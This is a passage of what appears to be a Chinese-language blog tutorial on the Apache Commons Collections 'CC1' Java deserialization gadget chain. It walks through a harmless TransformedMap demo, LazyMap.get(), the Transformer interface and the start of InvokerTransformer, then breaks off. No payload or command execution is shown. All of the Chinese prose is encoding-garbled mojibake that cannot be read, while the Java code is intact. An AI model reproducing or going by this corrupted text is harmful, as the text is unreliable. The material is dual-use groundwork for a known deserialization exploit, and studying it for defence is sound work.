<p><em>Ëøô‰∏™Á±ªÁªßÊâø‰∫Ü‰∏Ä‰∏™Á±ªÂíåÂÆûÁé∞‰∫Ü‰∏Ä‰∏™Êé•Âè£</em>„ÄÇÂÜçÁúãÊ∫êÁ†ÅÂÖ∂ÂÆûÂèØ‰ª•ÂèëÁé∞ÂæàÂ§öÊñπÊ≥ïÈÉΩÂÆûÁé∞‰∫Ü<code>transform()</code>ÊñπÊ≥ï</p>
<p>ËøôÈáåÁªô‰∏Ä‰∏™Á§∫‰æãÂà©Áî®‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="w"> </span><span class="n">num</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">valueTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;1&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ÂàùÂßãÂåñmap:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hashMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ÂàõÂª∫TransformedMap</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="w"> </span><span class="n">keyTransformer</span><span class="p">,</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;b&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;transformMap:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;w&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;transformMap:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;transformMap:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøêË°åÂêéÁöÑËæìÂá∫ÁªìÊûúÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÂàùÂßãÂåñmap:{1=a}
</span></span><span class="line"><span class="cl">transformMap:{1=a, 3=b1}
</span></span><span class="line"><span class="cl">transformMap:{1=a, 2=w1, 3=b1}
</span></span><span class="line"><span class="cl">transformMap:{2=w1, 3=b1}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ∂ÂÆûËøôÈáåÂá∫Áé∞Ëøô‰∏™ÁªìÊûúÁöÑÂéüÂõ†ËøòÊòØÂíåÂØπË±°Áõ∏ÂÖ≥ÔºåÂèØ‰ª•Êù•Ë∞ÉËØï‰∏Ä‰∏ãÔºö</p>
<ul>
<li>
<p><strong>ËøôÈáåÈ¶ñÂÖà‰∫ÜËß£‰∏Ä‰∏ãÂåøÂêçÁ±ªÊòØ‰ªÄ‰πà</strong>ÔºåÂèØ‰ª•ÂèÇËÄÉËøô‰∏™<a class="link" href="https://blog.csdn.net/m0_73370205/article/details/134276110"  target="_blank" rel="noopener"
    >ÊñáÁ´†</a>ÔºåÂ∞±ÊòØ<u>ÂèØ‰ª•ÂÆûÁé∞‰∏Ä‰∏™Á±ª‰∏≠ÂåÖÂê´Âè¶Â§ñ‰∏Ä‰∏™Á±ª</u>Ôºå‰∏î‰∏çÈúÄË¶ÅÊèê‰æõ‰ªª‰ΩïÁöÑÁ±ªÂêçÁõ¥Êé•ÂÆû‰æãÂåñ„ÄÇ<u>‰∏ªË¶ÅÊòØÁî®‰∫éÂú®Êàë‰ª¨ÈúÄË¶ÅÁöÑÊó∂ÂÄôÂàõÂª∫‰∏Ä‰∏™ÂØπË±°Êù•ÊâßË°åÁâπÂÆöÁöÑ‰ªªÂä°</u>ÔºåÂèØ‰ª•‰Ωø‰ª£Á†ÅÊõ¥Âä†ÁÆÄÊ¥Å„ÄÇ</p>
</li>
<li>
<p><strong>ÈáçË¶ÅËØ¥ÊòéÔºö<strong>È¶ñÂÖàÂú®Ëøô‰∏≤‰ª£Á†Å</strong>‰ΩøÁî®ÂåøÂêçÁ±ªÂÆûÁé∞‰∫ÜTransformerÊé•Âè£</strong>ÔºåÂàõÂª∫‰∫Ü‰∏Ä‰∏™ÂØπË±°Ôºå‰ª£Á†ÅÈÉΩ‰ΩøÁî®ÂåøÂêçÁ±ªÂÆûÁé∞‰∫ÜTransformerÊé•Âè£ÔºåÂàõÂª∫‰∫Ü‰∏Ä‰∏™‰∏¥Êó∂ÁöÑÁ±ªÂÆû‰æãÔºàÂç≥ÂØπË±°ÔºâÔºåÂπ∂Â∞ÜËøô‰∏™Á±ªÂÆû‰æãËµãÂÄºÁªô‰∫ÜkeyTransformerÂíåvalueTransformerÂπ∂ÈÉΩÈáçÂÜô‰∫Ütransform()ÊñπÊ≥ïÔºåËøô‰∏™ÊòØÊúÄÈáçË¶ÅÁöÑ„ÄÇÔºàÈáçË¶ÅÁöÑÊòØÁúã‰ª£Á†ÅÔºå‰∏ÄÁúãÂ∞±ÊáÇ‰∫ÜÔºâ</p>
</li>
</ul>
<p><strong>ÁÑ∂ÂêéÂºÄÂßãË∞ÉËØïÔºö</strong></p>
<p>ÈáçË¶ÅÁúãÂêéÈù¢ÁöÑputÈÇ£ÈÉ®ÂàÜÔºåÁ¨¨‰∏Ä‰∏™Â∞±ÊòØHashMapÁ±ªÁöÑputÊñπÊ≥ïÔºåÂ∞±ÊòØÊîæÂÖ•‰∏ÄÂØπÈîÆÂÄºÂØπÔºå‰∏çÂ§öËØ¥„ÄÇÈáçÁÇπÁúãÂêéÈù¢„ÄÇ</p>
<p>ÁÑ∂ÂêéË∞ÉÁî®</p>
<p><img src="/p/cc1/image-20240716160351313.png"
	width="821"
	height="32"
	srcset="/p/cc1/image-20240716160351313_hu1890807893203420675.png 480w, /p/cc1/image-20240716160351313_hu7696334334942200381.png 1024w"
	loading="lazy"
	
		alt="image-20240716160351313"
	
	
		class="gallery-image" 
		data-flex-grow="2565"
		data-flex-basis="6157px"
	
></p>
<p>Ë∑üËøõÊ∫êÁ†ÅÔºö</p>
<p><img src="/p/cc1/image-20240716160420770.png"
	width="1024"
	height="255"
	srcset="/p/cc1/image-20240716160420770_hu13525777952013783869.png 480w, /p/cc1/image-20240716160420770_hu9468735641298846168.png 1024w"
	loading="lazy"
	
		alt="image-20240716160420770"
	
	
		class="gallery-image" 
		data-flex-grow="401"
		data-flex-basis="963px"
	
></p>
<p>Âç≥ËøîÂõû‰∏Ä‰∏™TransformedMapÂØπË±°ÔºåÂπ∂‰∏îÊ≠§Êó∂ÁöÑkeyTransformerÂíåvalueTransformerÂØπÂ∫îËá™ÂÆö‰πâÁöÑÂåøÂêçÁ±ª„ÄÇ</p>
<p>ÁÑ∂ÂêéÂä†Êñ≠ÁÇπÔºö</p>
<p><img src="/p/cc1/image-20240716101142675.png"
	width="1056"
	height="119"
	srcset="/p/cc1/image-20240716101142675_hu10569159308187278644.png 480w, /p/cc1/image-20240716101142675_hu8593440384923887814.png 1024w"
	loading="lazy"
	
		alt="image-20240716101142675"
	
	
		class="gallery-image" 
		data-flex-grow="887"
		data-flex-basis="2129px"
	
></p>
<p>ÁÑ∂ÂêéÁé∞Âú®Êù•ÁúãÂØπÂ∫îÁöÑÂèòÈáèÁöÑÂÄºÔºö</p>
<p><img src="/p/cc1/image-20240716155510991.png"
	width="591"
	height="235"
	srcset="/p/cc1/image-20240716155510991_hu10119732951809366875.png 480w, /p/cc1/image-20240716155510991_hu18402590860196567233.png 1024w"
	loading="lazy"
	
		alt="image-20240716155510991"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="603px"
	
></p>
<p>ÈáçÁÇπÁúãÂÄºÔºåÊ≥®ÊÑèvalueTransformerÂíåkeyTransformerÁöÑÂÄº‰∏∫<code>Test$2..</code>Âíå<code>Test$1..</code>ÔºåÁõ∏‰∫íÂØπÊØîÂà∞Êù•ÁúãÔºåÂèØ‰ª•ÂæàÂÆπÊòìÁúãÂá∫ËøôÁßçÊ†ºÂºèÂ∞±ÊòØ‰ª£Ë°®ÂåøÂêçÁ±ªÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™TestÁ±ªÂÆû‰æã„ÄÇ</p>
<p>Âú®ÂêéÁª≠ÁöÑ<code>map.put()</code>‰∏≠ÔºåË∞ÉÁî®ÁöÑÂ∞±ÊòØTransformedMapÁ±ªÁöÑputÊñπÊ≥ïÔºö</p>
<p><img src="/p/cc1/image-20240716160032878.png"
	width="788"
	height="152"
	srcset="/p/cc1/image-20240716160032878_hu9496577734128173482.png 480w, /p/cc1/image-20240716160032878_hu17563393713374614930.png 1024w"
	loading="lazy"
	
		alt="image-20240716160032878"
	
	
		class="gallery-image" 
		data-flex-grow="518"
		data-flex-basis="1244px"
	
></p>
<p>ÁÑ∂ÂêéÂ∞±‰ºöË∞ÉÁî®transformKeyÊñπÊ≥ïÔºåÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p>
<p><img src="/p/cc1/image-20240716160152729.png"
	width="921"
	height="119"
	srcset="/p/cc1/image-20240716160152729_hu8917732215227742937.png 480w, /p/cc1/image-20240716160152729_hu14537616952497355510.png 1024w"
	loading="lazy"
	
		alt="image-20240716160152729"
	
	
		class="gallery-image" 
		data-flex-grow="773"
		data-flex-basis="1857px"
	
></p>
<p>Ê≠§Êó∂Â∞±‰ºöË∞ÉÁî®keyTransformerÁöÑtransformÊñπÊ≥ïÔºåÊ≠§Êó∂Ë∞ÉÁî®ÁöÑÂ∞±ÊòØÂåøÂêçÁ±ªÁöÑtransformÊñπÊ≥ïÔºåÈÇ£‰πàÂ∞±ÊòØ</p>
<p><img src="/p/cc1/image-20240716160643025.png"
	width="812"
	height="232"
	srcset="/p/cc1/image-20240716160643025_hu7026351976331067135.png 480w, /p/cc1/image-20240716160643025_hu9245866363731304414.png 1024w"
	loading="lazy"
	
		alt="image-20240716160643025"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>valueTransformer.transformer()ÂêåÁêÜ„ÄÇÈÄªËæëÊòØËøôÊ†∑ÔºåÂπ∂‰∏îÂú®Ë∞ÉËØïËøáÁ®ã‰∏≠‰πüÂêåÊ†∑ËøôËøô‰∏™ËøáÁ®ã„ÄÇ</p>
<p>ÁªßÁª≠Áúã<code>map.put()</code>ÊñπÊ≥ïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">return this.getMap().put(key, value);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏™getMapÂØπÂ∫îTransformedMapÁöÑÁà∂Á±ªAbstractInputCheckedMapDecoratorÁöÑÁà∂Á±ªAbstractMapDecoratorÁöÑgetMap()ÊñπÊ≥ïÔºåÊ∫êÁ†Å‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">getMap</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªìÂêàÂâçÈù¢ÁöÑÂÆû‰æãÂåñÁöÑÊèèËø∞ÔºåÂèØ‰ª•Áü•ÈÅìËøôÈáåÁöÑmapÂç≥HashMapÁ±ªÂÆû‰æãÔºåÊâÄ‰ª•ËøôÈáå‰ºöÂÜçË∞ÉÁî®HashMapÁöÑputÊñπÊ≥ïÊîæÂÖ•‰∏ÄÂØπ‰øÆÈ•∞ÂêéÁöÑÈîÆÂÄºÂØπ„ÄÇ</p>
<p>ÂêéÈù¢ÈÇ£‰∏™ÂêåÁêÜ</p>
<p>ÊúÄÂêé‰ºöË∞ÉÁî®HashMaspÁ±ªÁöÑremoveÊñπÊ≥ïÊù•ÂéªÊéâ‰∏Ä‰∏™ÈîÆÂÄºÂØπ„ÄÇ</p>
<p><strong>‰ª£Á†ÅÂàÜÊûêÁªìÊùüÔºåÂØπ‰∫éËøô‰∏ÄÊÆµÁ§∫‰æã‰ª£Á†ÅÂ∞±ÈúÄË¶ÅÁêÜËß£ÈÄèÂΩªÔºå‰∫ÜËß£ÂÖ∂‰∏≠ÁöÑËøêË°åËøáÁ®ã‰∏éÈÄªËæëÔºåÂêéÈù¢‰ºöÊúâÁî®„ÄÇ</strong></p>
<p>‰πüÂ∞±ÊòØËØ¥ÂΩì TransformedMap ÂÜÖÁöÑ key ÊàñËÄÖ value ÂèëÁîüÂèòÂåñÊó∂Ôºà‰æãÂ¶ÇË∞ÉÁî® TransformedMap ÁöÑ <code>put</code> ÊñπÊ≥ïÊó∂ÔºâÔºåÂ∞±‰ºöËß¶ÂèëÁõ∏Â∫îÂèÇÊï∞ÁöÑ Transformer ÁöÑ <code>transform()</code> ÊñπÊ≥ï„ÄÇ</p>
<h5 id="lazymap">LazyMap
</h5><p><code>org.apache.commons.collections.map.LazyMap</code>‰∏éTransformedMapÁ±ª‰ººÔºåËøô‰∏™Á±ªËß¶Âèëtransform()ÊñπÊ≥ïÁöÑÁÇπÂ∞±Âú®‰∫éË∞ÉÁî®<code>get()</code>ÊñπÊ≥ïÊó∂‰º†ÂÖ•ÁöÑkey‰∏çÂ≠òÂú®ÔºåÁúã‰∏Ä‰∏ãget()ÊñπÊ≥ïÁöÑÊ∫êÁ†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="kd">super</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">factory</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÁúã‰∏ãÈù¢Ôºö</p>
<p><img src="/p/cc1/image-20240716170115691.png"
	width="855"
	height="54"
	srcset="/p/cc1/image-20240716170115691_hu5141287052842932664.png 480w, /p/cc1/image-20240716170115691_hu12995540338411411395.png 1024w"
	loading="lazy"
	
		alt="image-20240716170115691"
	
	
		class="gallery-image" 
		data-flex-grow="1583"
		data-flex-basis="3800px"
	
></p>
<p>ÂèØ‰ª•Áü•ÈÅìLazyMapÁ±ªÁªßÊâø‰∫éAbstractMapDecorator„ÄÇ</p>
<p><code>org.apache.commons.collections.map.DefaultedMap</code>‰∏éLazyMapÂÖ∑ÊúâÁõ∏ÂêåÂäüËÉΩÔºåÂêåÊ†∑ÊòØ<code>get()</code>ÊñπÊ≥ï‰ºöËß¶Âèëtransform ÊñπÊ≥ï„ÄÇ</p>
<h5 id="transformer">Transformer
</h5><p><code>org.apache.commons.collections.Transformer</code>ÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºåÊ∫ê‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.apache.commons.collections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Transformer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÆÉÊèê‰æõ‰∫Ü‰∏Ä‰∏™<code>transform()</code>ÊñπÊ≥ïÔºåÁî®Êù•ÂÆö‰πâÂÖ∑‰ΩìÁöÑËΩ¨Êç¢ÈÄªËæë„ÄÇ</p>
<p>Âú®Commons Colection È°πÁõÆ‰∏≠ÔºåÁ®ãÂ∫èÊèê‰æõ‰∫Ü21‰∏™Transformer ÁöÑÂÆûÁé∞Á±ªÔºåÁî®Êù•ÂÆûÁé∞‰∏çÂêåÁöÑÂØπTransformedMap ‰∏≠ÁöÑ key/value ËøõË°å‰øÆÊîπÁöÑÂäüËÉΩ</p>
<p><img src="/p/cc1/image-20240716095330668.png"
	width="1376"
	height="609"
	srcset="/p/cc1/image-20240716095330668_hu14950271854234441396.png 480w, /p/cc1/image-20240716095330668_hu2946226984900469356.png 1024w"
	loading="lazy"
	
		alt="image-20240716095330668"
	
	
		class="gallery-image" 
		data-flex-grow="225"
		data-flex-basis="542px"
	
></p>
<p>ÈáçÁÇπÂÖ≥Ê≥®Âá†‰∏™ÂÆûÁé∞Á±ª</p>
<h5 id="invokertransformer">InvokerTransformer
</h5><p><code>org.apache.commons.collections.functors.InvokerTransformer</code>ÔºåËøô‰∏™ÂÆûÁé∞Á±ª‰ªé Commons Collections 3.0 ÂºïÂÖ•ÔºåÂäüËÉΩÊòØ‰ΩøÁî®ÂèçÂ∞ÑÂàõÂª∫‰∏Ä‰∏™Êñ∞ÂØπË±°ÔºåÊù•Áúã‰∏Ä‰∏ãÂÆÉÁöÑtransformÊñπÊ≥ïÊ∫êÁ†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
